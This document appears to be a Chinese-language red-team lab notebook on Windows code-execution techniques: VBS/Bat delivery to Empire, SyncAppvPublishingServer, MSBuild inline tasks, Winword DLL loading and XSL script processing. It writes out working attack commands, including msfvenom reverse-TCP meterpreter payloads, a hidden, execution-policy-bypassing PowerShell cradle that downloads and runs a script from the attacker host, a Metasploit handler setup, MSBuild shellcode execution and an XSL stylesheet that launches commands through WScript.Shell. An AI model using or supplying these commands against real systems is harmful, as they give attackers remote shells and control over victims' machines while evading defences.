## 脚本执行 (Scripting)

### 1. VBS
**环境:**
- 攻击机: Kali (IP: 10.100.18.20)
- 被攻击机: Windows Server 2012 R2 (IP: 10.100.18.22)

**前提条件:**
- 在被攻击机上安装Python 2.7（或者将.py文件打包成.exe格式以绕过杀毒软件）

**攻击手法:**
1. **生成VBS代码:**
   - 利用VBS生成恶意代码。
   - ![VBS代码](media/image79.jpeg){width="4.610149825021872in" height="3.5520833333333335in"}
   - ![VBS代码](media/image80.jpeg){width="5.882767935258093in" height="1.0908333333333333in"}
   - ![VBS代码](media/image81.jpeg){width="5.879970472440945in" height="1.3658333333333332in"}
   - ![VBS代码](media/image82.jpeg){width="5.875132327209099in" height="1.58125in"}

2. **生成批处理文件:**
   - 使用Bat生成批处理文件。
   - ![Bat代码](media/image83.jpeg){width="5.043902012248469in" height="3.2954166666666667in"}

3. **目标主机执行:**
   - 在目标主机上执行生成的批处理文件。
   - ![执行结果](media/image84.jpeg){width="5.889336176727909in" height="1.0954166666666667in"}

4. **Empire成功获取Agent:**
   - Empire框架成功获取Agent。
   - ![Empire Agent](media/image85.jpeg){width="5.8759361329833775in" height="1.4941655730533683in"}

5. **执行系统命令:**
   - 通过Empire执行系统命令。
   - ![系统命令](media/image86.jpeg){width="5.871458880139983in" height="1.283332239720035in"}

### 2. JScript
- 参考代码: [GitHub Gist](https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec)
- ![JScript代码](media/image87.jpeg){width="4.375623359580053in" height="3.006666666666667in"}

## SyncAppvPublishingServer

**环境:**
- Kali: 10.100.19.19
- Win10: 10.100.0.200

**攻击手法:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.19.19 LPORT=4444 -f psh-reflection > 4444.ps1
SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://10.100.19.19/4444.ps1');4444.ps1) | IEX"
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.100.19.19/4444.ps1')"
```
- 未复现成功。

## Trusted Developer Utilities（值得信赖的开发者工具）

**环境:**
- Kali: 10.100.19.19
- Win7: 10.100.0.25

**工具地址:**
- MSBuild: [GitHub](https://github.com/3gstudent/msbuild-inline-task.git)

**攻击手法:**
1. **生成Shellcode:**
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.100.19.19 lport=4444 -f csharp
   ```

2. **替换Shellcode到`exec64.xml`文件中:**
   - 编辑`exec64.xml`文件，将生成的Shellcode插入其中。

3. **MSF设置:**
   ```bash
   use exploit/multi/handler
   set payload windows/x64/meterpreter/reverse_tcp
   set lhost 10.100.19.19
   set lport 4444
   exploit
   ```

4. **通过MSBuild运行以获得Meterpreter会话:**
   ```bash
   C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe exec64.xml
   ```
   - ![Meterpreter会话](media/image88.jpeg){width="5.878252405949256in" height="3.1625in"}

## Winword

**环境:**
- Kali: 10.100.19.19
- Win7: 10.100.0.25
- Office 2013

**攻击手法:**
- 利用Office Word的/l参数加载DLL文件。
- 命令: `winword.exe /l dllfile.dll`
- 使用Kali制作DLL并本地执行加载payload。
- 未反弹shell，复现失败。

## XSL Script Processing（XSL脚本处理）

**环境:**
- Kali: 10.100.19.19
- Win7: 10.100.0.25

**攻击手法:**
1. **在Kali上制作两个文件，并启动HTTP服务器:**
   ```bash
   python3 -m http.server 80
   ```

2. **创建`customers.xml`和`script.xsl`文件:**
   - `customers.xml`:
     ```xml
     <Customers>
       <Customer>
         <Name>John Doe</Name>
         <Company>Microsoft</Company>
       </Customer>
     </Customers>
     ```
   - `script.xsl`:
     ```xml
     <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
       <xsl:template match="/">
         <xsl:value-of select="user:xml(.)"/>
       </xsl:template>
       <msxsl:script language="JScript" implements-prefix="user">
         <![CDATA[
           function xml(nodelist) {
             var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k calc.exe");
             return nodelist.nextNode().xml;
           }
         ]]>
       </msxsl:script>
     </xsl:stylesheet>
     ```

通过这些步骤，可以实现对目标系统的攻击。